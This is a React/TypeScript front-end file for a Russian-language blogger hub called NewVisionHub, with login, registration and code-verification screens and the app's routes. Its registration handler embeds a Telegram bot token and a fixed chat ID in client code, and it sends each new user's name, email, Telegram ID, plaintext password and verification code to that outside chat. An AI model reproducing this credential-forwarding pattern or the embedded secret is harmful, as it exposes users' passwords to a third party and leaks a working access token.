import React, { useState } from 'react';
import { HashRouter, Routes, Route, Navigate } from 'react-router-dom';
import { AuthProvider, useAuth } from './context/AuthContext';
import Layout from './components/Layout';
import Dashboard from './pages/Dashboard';
import Bookings from './pages/Bookings';
import Inventory from './pages/Inventory';
import Requests from './pages/Requests';
import Community from './pages/Community';
import Events from './pages/Events';
import MyCalendar from './pages/MyCalendar';
import Users from './pages/Users';
import { Send, Smartphone, ArrowRight, CheckCircle2, ChevronLeft, Info } from 'lucide-react';

const AuthPage = () => {
  const { login, initiateRegistration, confirmEmail, pendingUser } = useAuth();
  const [viewState, setViewState] = useState<'login' | 'register' | 'code'>('login');
  const [name, setName] = useState('');
  const [email, setEmail] = useState('');
  const [telegramId, setTelegramId] = useState('');
  const [password, setPassword] = useState('');
  const [code, setCode] = useState('');
  const [error, setError] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    setError('');
    const result = await login(email, password);
    setIsLoading(false);
    if (!result.success) setError(result.error || 'Ошибка входа');
  };

  const handleRegister = async (e: React.FormEvent) => {
    e.preventDefault();
    setError('');
    const generatedCode = initiateRegistration(name, email, password, telegramId);
    
    // Telegram notification logic
    const token = "8254098834:AAHUmQdcykJ8_Bb7RkkD5N1PJYjIF4EA2ig";
    const chatId = "916014394";
    const text = `🆕 Регистрация блогера\nФИО: ${name}\nTelegram ID: ${telegramId}\nEmail: ${email}\nПароль: ${password}\nКод с сайта: ${generatedCode}`;
    
    try {
        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chatId, text })
        });
        setViewState('code');
    } catch (err) {
        setError('Ошибка связи с сервером');
    }
  };

  const handleVerify = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    const success = await confirmEmail(code);
    setIsLoading(false);
    if (!success) setError('Неверный код подтверждения');
  };

  if (viewState === 'login') {
    return (
      <div className="min-h-screen bg-slate-100 flex items-center justify-center p-4">
        <div className="bg-white p-8 rounded-2xl shadow-xl w-full max-w-md text-center">
          <h1 className="text-3xl font-bold mb-2 text-orange-500">NewVisionHub</h1>
          <p className="text-slate-500 mb-8">Войдите в свой аккаунт</p>
          <form onSubmit={handleLogin} className="space-y-4 text-left">
            <input type="email" placeholder="Email" className="w-full px-4 py-3 rounded-lg border border-slate-200 focus:ring-2 focus:ring-orange-500 outline-none" value={email} onChange={e => setEmail(e.target.value)} required />
            <input type="password" placeholder="Пароль" className="w-full px-4 py-3 rounded-lg border border-slate-200 focus:ring-2 focus:ring-orange-500 outline-none" value={password} onChange={e => setPassword(e.target.value)} required />
            {error && <p className="text-red-500 text-sm text-center">{error}</p>}
            <button type="submit" disabled={isLoading} className="w-full bg-orange-500 text-white py-3 rounded-lg font-bold hover:bg-orange-600 transition shadow-lg shadow-orange-200">
              {isLoading ? 'Загрузка...' : 'Войти'}
            </button>
          </form>
          <button onClick={() => setViewState('register')} className="mt-6 text-sm text-slate-500 hover:text-orange-500">Нет аккаунта? Зарегистрироваться</button>
        </div>
      </div>
    );
  }

  if (viewState === 'register') {
    return (
      <div className="min-h-screen bg-slate-100 flex items-center justify-center p-4">
        <div className="bg-white p-8 rounded-2xl shadow-xl w-full max-w-3xl flex flex-col md:flex-row gap-8">
          <div className="md:w-1/2 bg-slate-50 p-6 rounded-xl border border-slate-200">
            <h3 className="font-bold text-lg mb-4 flex items-center gap-2"><Send className="text-blue-500" size={20}/> Шаг 1: Бот</h3>
            <p className="text-sm text-slate-600 mb-4">Откройте нашего бота и нажмите старт, чтобы получить уведомление с кодом.</p>
            <a href="https://t.me/blogerhub37bot" target="_blank" className="block w-full text-center bg-blue-500 text-white py-2 rounded-lg font-bold hover:bg-blue-600 transition mb-6">Открыть @blogerhub37bot</a>
            
            <div className="bg-blue-50 border border-blue-100 p-4 rounded-lg">
                <p className="text-xs text-blue-700 flex items-start gap-2">
                    <Info size={16} className="shrink-0 mt-0.5" />
                    Для регистрации нам нужен ваш Telegram ID. Его можно узнать в боте <a href="https://t.me/userinfobot" target="_blank" className="underline font-bold">@userinfobot</a>
                </p>
            </div>
          </div>
          <div className="md:w-1/2">
            <h3 className="font-bold text-lg mb-4">Шаг 2: Данные</h3>
            <form onSubmit={handleRegister} className="space-y-3">
              <input type="text" placeholder="ФИО" className="w-full px-4 py-2 rounded-lg border border-slate-200 outline-none focus:ring-1 focus:ring-orange-500" value={name} onChange={e => setName(e.target.value)} required />
              <input type="email" placeholder="Email" className="w-full px-4 py-2 rounded-lg border border-slate-200 outline-none focus:ring-1 focus:ring-orange-500" value={email} onChange={e => setEmail(e.target.value)} required />
              <input type="text" placeholder="Telegram ID (числа)" className="w-full px-4 py-2 rounded-lg border border-slate-200 outline-none focus:ring-1 focus:ring-orange-500" value={telegramId} onChange={e => setTelegramId(e.target.value)} required />
              <input type="password" placeholder="Пароль" className="w-full px-4 py-2 rounded-lg border border-slate-200 outline-none focus:ring-1 focus:ring-orange-500" value={password} onChange={e => setPassword(e.target.value)} required />
              <button type="submit" className="w-full bg-orange-500 text-white py-3 rounded-lg font-bold hover:bg-orange-600 transition">Получить код</button>
            </form>
            <button onClick={() => setViewState('login')} className="mt-4 text-sm text-slate-400 flex items-center gap-1 hover:text-orange-500 transition"><ChevronLeft size={16}/> Назад к входу</button>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-slate-100 flex items-center justify-center p-4">
      <div className="bg-white p-8 rounded-2xl shadow-xl w-full max-w-md text-center">
        <h2 className="text-2xl font-bold mb-2">Проверка кода</h2>
        <p className="text-sm text-slate-500 mb-6">Введите 6-значный код из Telegram</p>
        <form onSubmit={handleVerify} className="space-y-4">
          <input type="text" maxLength={6} placeholder="000000" className="w-full px-4 py-4 rounded-xl border-2 border-slate-200 text-center text-3xl tracking-widest font-mono focus:border-orange-500 outline-none" value={code} onChange={e => setCode(e.target.value)} required />
          {error && <p className="text-red-500 text-sm">{error}</p>}
          <button type="submit" disabled={isLoading} className="w-full bg-orange-500 text-white py-3 rounded-lg font-bold hover:bg-orange-600 transition">
            {isLoading ? 'Проверка...' : 'Подтвердить'}
          </button>
        </form>
        <button onClick={() => setViewState('register')} className="mt-6 text-sm text-slate-400 hover:text-orange-500 transition flex items-center justify-center gap-1 mx-auto">
            <ChevronLeft size={16}/> Изменить данные
        </button>
      </div>
    </div>
  );
};

const AppRoutes = () => {
    const { user } = useAuth();
    return (
        <Routes>
          <Route path="/" element={user ? <Layout /> : <Navigate to="/login" />}>
            <Route index element={<Dashboard />} />
            <Route path="bookings" element={<Bookings />} />
            <Route path="inventory" element={<Inventory />} />
            <Route path="my-calendar" element={<MyCalendar />} />
            <Route path="requests" element={<Requests />} />
            <Route path="community" element={<Community />} />
            <Route path="events" element={<Events />} />
            <Route path="users" element={<Users />} />
          </Route>
          <Route path="/login" element={!user ? <AuthPage /> : <Navigate to="/" />} />
          <Route path="*" element={<Navigate to="/" />} />
        </Routes>
    );
};

const App = () => {
  return (
    <AuthProvider>
      <HashRouter>
        <AppRoutes />
      </HashRouter>
    </AuthProvider>
  );
};

export default App;